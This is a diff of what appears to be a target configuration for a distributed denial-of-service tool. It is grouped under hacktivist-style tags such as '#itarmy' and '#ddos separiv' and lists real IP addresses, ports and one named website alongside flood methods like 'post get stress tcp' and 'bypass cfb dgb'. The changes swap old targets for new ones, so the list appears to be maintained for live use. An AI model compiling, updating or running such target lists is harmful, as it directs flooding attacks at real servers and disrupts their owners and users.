@@ -7,13 +7,7 @@ https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb
 
 #itarmy
 
-tcp://193.164.150.212:443 tcp://94.26.241.164:443 --http-methods post get stress tcp 
 
-tcp://95.214.60.149:21 tcp://95.214.60.149:22 tcp://95.214.60.149:80 tcp://95.214.60.149:443 --http-methods post get stress tcp
-
-tcp://89.208.35.174:80 tcp://89.208.35.174:443 tcp://89.208.35.174:22 --http-methods post get stress tcp
-
-tcp://178.248.236.15:80 tcp://178.248.236.15:443 tcp://178.248.232.202:80 tcp://178.248.232.202:443 --http-methods post get stress tcp
 
 
 
@@ -21,9 +15,9 @@ tcp://178.248.236.15:80 tcp://178.248.236.15:443 tcp://178.248.232.202:80 tcp://
 
 #ddos separiv
 
-tcp://195.242.82.13:80 tcp://195.242.82.13:443 tcp://185.179.146.43:80 tcp://185.179.146.43:443 --http-methods post get stress tcp
+tcp://178.248.232.150:80 tcp://178.248.232.150:443 tcp://87.251.82.205:80 tcp://87.251.82.205:443 --http-methods post get stress tcp
 
-tcp://195.242.83.13:80 tcp://195.242.83.13:443 tcp://193.164.146.24:80 tcp://193.164.146.24:443 --http-methods post get stress tcp
+
 
 
 
@@ -31,9 +25,11 @@ tcp://195.242.83.13:80 tcp://195.242.83.13:443 tcp://193.164.146.24:80 tcp://193
 
 #cyberspace
 
-tcp://178.248.232.33:80 tcp://178.248.232.33:443 tcp://185.179.146.43:443 tcp://178.213.78.4:443 --http-methods post get stress tcp
+tcp://194.54.14.131:80 tcp://194.54.14.131:443 tcp://195.19.96.198:80 tcp://195.19.96.198:443 --http-methods post get stress tcp
 
-tcp://84.201.156.231:80 tcp://84.201.156.231:443 tcp://94.124.195.43:80 tcp://94.124.195.43:443 tcp://178.213.78.4:80 --http-methods post get stress tcp
+tcp://212.40.192.70:80 tcp://212.40.192.70:443 tcp://46.235.53.117:80 tcp://46.235.53.117:443 --http-methods post get stress tcp
+
+tcp://54.247.107.64:80 tcp://54.247.107.64:443 tcp://185.183.120.132:80 tcp://185.183.120.132:443 --http-methods post get stress tcp
 
 
 
